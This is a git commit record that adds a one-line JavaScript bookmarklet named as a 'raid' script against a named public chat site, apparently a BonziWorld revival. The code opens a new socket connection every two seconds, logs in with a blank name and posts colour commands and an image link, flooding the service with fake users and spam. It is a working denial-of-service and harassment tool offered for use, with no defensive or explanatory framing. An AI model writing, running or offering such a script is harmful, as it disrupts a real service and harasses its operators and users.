dc167f336b38b83be68078578867795bb140e74d
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-01-09 18:43:55 -0300

    Create blankbonziworldrevivedraid.js

---
+++ blankbonziworldrevivedraid.js
@@ -0,0 +1,1 @@
+JavaScript:setInterval(function(){var sockets = []; var G = io("https://bonziworld-revived-1.onrender.com/"); sockets.push(G);G.emit('login',{name:' '}); G.emit("command", {list: ["color", "green"]}); G.emit("command", {list: ["color", "green"]}); G.emit("command", {list: ["img","https://files.catbox.moe/ovmqeo.png"]})} ,2000);
